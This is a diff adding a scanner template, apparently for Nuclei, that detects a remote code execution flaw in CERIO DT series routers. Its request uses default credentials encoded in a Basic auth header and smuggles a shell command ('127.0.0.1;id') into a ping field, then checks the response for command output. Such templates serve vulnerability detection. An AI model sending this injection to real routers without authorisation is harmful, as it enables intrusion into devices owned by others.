@@ -1,0 +1,30 @@
+id: cerio-dt-router-rce
+info:
+  name: CERIO DT Series Router Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+
+http:
+  - method: POST
+    path:
+      - "/cgi-bin/Save.cgi?cgi=PING"
+    headers:
+      Authorization: Basic b3BlcmF0b3I6MTIzNA==
+      Content-Type: application/x-www-form-urlencoded
+    body: pid=2061&ip=127.0.0.1;id&times=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
